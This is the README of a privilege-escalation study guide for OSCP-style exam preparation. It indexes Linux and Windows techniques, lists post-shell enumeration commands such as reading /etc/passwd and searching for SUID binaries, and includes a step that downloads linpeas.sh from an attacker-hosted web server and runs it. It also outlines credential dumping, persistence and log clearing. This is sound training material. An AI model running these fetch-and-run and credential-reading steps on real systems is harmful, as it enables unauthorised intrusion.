# Privilege Escalation Notes — Complete Study Guide

> **Purpose:** Self-contained privilege escalation notes for NSDA exam, internship, and OSCP preparation.
> No external resources needed. Every concept, command, and technique is explained here.

---

## What is Privilege Escalation?

After getting initial access to a system (low-privilege shell), privilege escalation means finding a way to **gain higher privileges** — typically `root` on Linux or `SYSTEM/Administrator` on Windows.

```
Attack Flow:
Nmap Scan → Exploit Vulnerability → Low Shell → Privilege Escalation → Root/SYSTEM
```

You almost never land directly as root. Priv esc is what happens **after** you get in.

---

## 📁 File Structure

```
privesc-notes/
│
├── README.md                          ← You are here (Start here)
│
├── linux-privesc/
│   ├── 00-enumeration.md
│   ├── 01-suid-abuse.md
│   ├── 02-sudo-misconfiguration.md
│   ├── 03-cron-job-abuse.md
│   ├── 04-kernel-exploit.md
│   ├── 05-weak-file-permissions.md
│   ├── 06-path-hijacking.md
│   ├── 07-capabilities.md
│   ├── 08-environment-variables.md
│   └── 09-credential-hunting.md
│
└── windows-privesc/
    ├── 01-token-impersonation.md
    ├── 02-unquoted-service-path.md
    └── 03-alwaysinstallelevated.md
```

---

## 🐧 Linux Privilege Escalation

| # | Topic | 
|---|-------|
| 00 | [Enumeration](linux-privesc/00-enumeration.md) | 
| 01 | [SUID Abuse](linux-privesc/01-suid-abuse.md) | 
| 02 | [Sudo Misconfiguration](linux-privesc/02-sudo-misconfiguration.md) | 
| 03 | [Cron Job Abuse](linux-privesc/03-cron-job-abuse.md) | 
| 04 | [Kernel Exploit](linux-privesc/04-kernel-exploit.md) | 
| 05 | [Weak File Permissions](linux-privesc/05-weak-file-permissions.md) | 
| 06 | [Path Hijacking](linux-privesc/06-path-hijacking.md) | 
| 07 | [Capabilities](linux-privesc/07-capabilities.md) | 
| 08 | [Environment Variables](linux-privesc/08-environment-variables.md) | 
| 09 | [Credential Hunting](linux-privesc/09-credential-hunting.md) | 




---

## 🪟 Windows Privilege Escalation

| # | Topic | 
|---|-------|
| 01 | [Token Impersonation](windows-privesc/01-token-impersonation.md) | 
| 02 | [Unquoted Service Path](windows-privesc/02-unquoted-service-path.md) | 
| 03 | [AlwaysInstallElevated](windows-privesc/03-alwaysinstallelevated.md) | 

---

## 🛠️ First Thing To Do After Getting a Shell

Whenever you land on a system, run these commands **immediately** to understand your situation:

### On Linux:
```bash
id                          # Who am I? What groups am I in?
whoami                      # Current username
hostname                    # Machine name
uname -a                    # Kernel version (important for kernel exploits)
cat /etc/os-release         # OS version
cat /etc/passwd             # All users on the system
sudo -l                     # What can I run as sudo?
find / -perm -u=s 2>/dev/null   # All SUID binaries
cat /etc/crontab            # Scheduled jobs
```

### On Windows:
```cmd
whoami                      # Current user
whoami /priv                # What privileges do I have?
whoami /groups              # What groups am I in?
systeminfo                  # OS version, patch level
net users                   # All users
net localgroup administrators   # Who is admin?
```

---

## 📌 Quick Reference — Automated Tools

Instead of running all commands manually, these tools scan everything automatically:

| Tool | OS | Usage |
|------|----|-------|
| `linpeas.sh` | Linux | Automated Linux priv esc scanner |
| `winpeas.exe` | Windows | Automated Windows priv esc scanner |

### How to transfer linpeas to target:
```bash
# On your Kali machine — start a web server
python3 -m http.server 8080

# On the target machine — download and run
wget http://YOUR_KALI_IP:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

> **Note:** In exams, always run linpeas/winpeas first. Then manually exploit what it finds.

---

## Learning Order

```
Start Here:
01 SUID Abuse                          → Easiest, most common
02 Sudo Misconfig                      → Very common in real world
03 Cron Job Abuse                      → Medium difficulty
04 Weak Permissions                    → Simple concept, quick win
05 Kernel Exploit                      → You already saw this with udev
06 Token Impersonation (Windows)       → Most important Windows technique
07 Unquoted Service Path (Windows)
08 AlwaysInstallElevated (Windows)
```

---

## 🗺️ What to Learn Next

After completing these notes, the natural next steps are:

### 1. Active Directory (AD) Attacks
Real corporate networks run on Active Directory. This is where network pentesting gets serious.

| Topic | What it covers |
|-------|---------------|
| Kerberoasting | Steal and crack service account password hashes from Active Directory |
| AS-REP Roasting | Attack accounts that don't require Kerberos pre-authentication |
| Pass-the-Hash | Use NTLM hash directly to authenticate — no password cracking needed |
| Pass-the-Ticket | Steal Kerberos tickets and reuse them for authentication |
| BloodHound | Map AD permissions visually to find attack paths to Domain Admin |
| DCSync | Impersonate a Domain Controller and dump all password hashes |

**Tools:** BloodHound, Impacket suite, CrackMapExec, Rubeus, Mimikatz

---

### 2. Post-Exploitation
After getting root/SYSTEM, a real pentester does more than just stop there.

| Topic | What it covers |
|-------|---------------|
| Credential Dumping | Extract passwords and hashes from memory (Mimikatz, secretsdump) |
| Lateral Movement | Use access on one machine to move to other machines on the network |
| Pivoting | Route traffic through a compromised machine to reach internal networks |
| Persistence | Maintain access even after reboot (backdoors, scheduled tasks) |
| Covering Tracks | Clear logs to avoid detection |

**Tools:** Mimikatz, Metasploit (post modules), Chisel (pivoting), proxychains

---

### 3. Advanced Linux Privilege Escalation
These techniques go beyond the basics covered in this guide.

| Topic | What it covers |
|-------|---------------|
| LD_PRELOAD Abuse | Inject malicious shared library via sudo environment variable |
| NFS No_root_squash | Mount NFS share and plant SUID binary as root from attacker machine |
| PATH Hijacking | Place malicious binary earlier in PATH than the real one |
| Docker Group Abuse | Use Docker socket to mount host filesystem and escape to root |
| Capabilities Abuse | Binaries with Linux capabilities (like cap_setuid) can be abused like SUID |

---

### 4. Advanced Windows Privilege Escalation
Deeper Windows techniques for OSCP and professional engagements.

| Topic | What it covers |
|-------|---------------|
| DLL Hijacking | Place malicious DLL where a privileged program looks for it |
| Weak Service Permissions | Directly modify a service binary path to point to your payload |
| Stored Credentials | Find plaintext passwords in registry, config files, command history |
| SeDebugPrivilege | Inject into privileged processes if you have debug privilege |

---

### 5. Web Application Privilege Escalation
Since your primary goal is web app pentesting, these connect directly:

| Topic | What it covers |
|-------|---------------|
| RCE to Shell | Turning Remote Code Execution into a proper reverse shell |
| Container Escapes | Breaking out of Docker containers to reach the host |
| SSRF to Internal Access | Using Server-Side Request Forgery to access internal services |
| File Upload to Shell | Uploading webshells and stabilizing the shell |

---

### Suggested Learning Path After This

```
Current (these notes)
        ↓
Post-Exploitation basics (credential dumping, lateral movement)
        ↓
Active Directory attacks (Kerberoasting, BloodHound, Pass-the-Hash)
        ↓
Advanced Linux priv esc (LD_PRELOAD, Docker, Capabilities)
        ↓
OSCP preparation (TryHackMe Pro labs / HackTheBox)
```

**Best Practice Platforms:**
- TryHackMe — structured learning rooms for each topic above
- HackTheBox — more realistic machines, good for OSCP prep
- PortSwigger Web Academy — already using this for web app sec
